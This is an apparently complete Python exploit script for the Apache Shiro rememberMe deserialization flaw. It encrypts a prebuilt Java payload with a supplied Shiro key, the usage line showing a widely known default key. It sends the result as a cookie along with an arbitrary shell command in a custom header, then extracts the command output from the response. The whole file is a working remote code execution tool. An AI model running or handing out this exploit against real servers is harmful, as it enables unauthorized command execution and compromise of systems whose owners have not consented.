#coding:utf-8
import sys
import base64
import uuid
from Crypto.Cipher import AES
import requests,re

""" 生成cookie """
def encode_rememberme(key):
    with open('Exploit.class','rb+') as f:
        ysopayload=f.read()
    BS   = AES.block_size    # 16
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode =  AES.MODE_CBC 
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(ysopayload)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

def attack():
	if len(sys.argv)!=4:
		print('usage: python {} targetUrl shiroKey command\ne.g.:python shiro_rememberMe_rce.py http://192.168.0.106:8080/login kPH+bIxk5D2deZiIxcaaaA== id\nGitHub:https://github.com/admintony/').format(sys.argv[0])
		return
	cookie_payload = encode_rememberme(sys.argv[2])
	headers={
		"Cookie":"rememberMe={}".format(cookie_payload),
		"Testcmd":sys.argv[3]+" && echo command-result-end"
	}
	res = requests.get(sys.argv[1],headers=headers)
	#print(res.text)
	re_obj = re.compile(r'((?:.|\n)*)command-result-end')
	result = re_obj.findall(res.text)
	if len(result)!=0:
	    print(result[0])
	else:
	    print("[+] 可能不存在漏洞，请人工查验")
	
attack()